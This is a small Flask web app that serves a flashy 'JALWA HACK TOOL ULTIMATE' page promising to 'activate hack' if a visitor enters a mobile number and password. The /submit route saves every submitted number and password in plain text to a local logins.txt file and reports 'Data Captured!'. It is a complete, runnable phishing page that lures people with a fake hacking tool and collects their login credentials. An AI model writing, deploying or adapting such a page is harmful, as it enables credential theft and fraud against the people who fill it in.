from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def home():
    return '''
    <html>
    <head>
        <title>Jalwa Hack Login 🔥</title>
        <style>
            body {
                background-color: black;
                color: #00FF00;
                font-family: monospace;
                text-align: center;
                padding-top: 50px;
            }
            h1 {
                color: lime;
                text-shadow: 0 0 10px #00FF00, 0 0 20px #00FF00, 0 0 30px #00FF00;
                font-size: 40px;
            }
            form {
                display: inline-block;
                background-color: rgba(0, 255, 0, 0.1);
                padding: 20px;
                border-radius: 10px;
                box-shadow: 0 0 20px #00FF00;
            }
            input[type="text"], input[type="password"] {
                width: 250px;
                padding: 10px;
                margin: 10px;
                background-color: black;
                color: #00FF00;
                border: 1px solid #00FF00;
                border-radius: 5px;
                font-size: 18px;
            }
            input[type="submit"] {
                padding: 10px 20px;
                font-size: 20px;
                color: #000;
                background-color: #00FF00;
                border: none;
                border-radius: 5px;
                cursor: pointer;
                box-shadow: 0 0 10px #00FF00;
            }
            input[type="submit"]:hover {
                background-color: #0f0;
            }
            p {
                color: yellow;
                font-size: 18px;
            }
        </style>
    </head>
    <body>
        <h1>🔥 JALWA HACK TOOL ULTIMATE 🔥</h1>
        <h3>H A C K   N U M B E R   F O U N D !</h3>
        <form action="/submit" method="post">
            <input type="text" name="number" placeholder="Enter Mobile Number"><br>
            <input type="password" name="password" placeholder="Enter Password"><br>
            <input type="submit" value="💣 Hack Now 💣">
        </form>
        <p>Use this number to sign up and activate hack - Jalwa Mode ON!</p>
    </body>
    </html>
    '''

@app.route('/submit', methods=['POST'])
def submit():
    number = request.form.get('number')
    password = request.form.get('password')
    with open("logins.txt", "a") as f:
        f.write(f"Number: {number}, Password: {password}\n")
    return '''
    <html>
    <head>
        <title>Hack Success</title>
        <style>
            body { background-color: black; color: lime; text-align: center; font-family: monospace; padding-top: 100px; }
            a { color: cyan; font-size: 20px; }
        </style>
    </head>
    <body>
        <h2>✅ Hack Successful! Data Captured!</h2>
        <a href="/">Back to Hack</a>
    </body>
    </html>
    '''

if __name__ == "__main__":
    app.run()
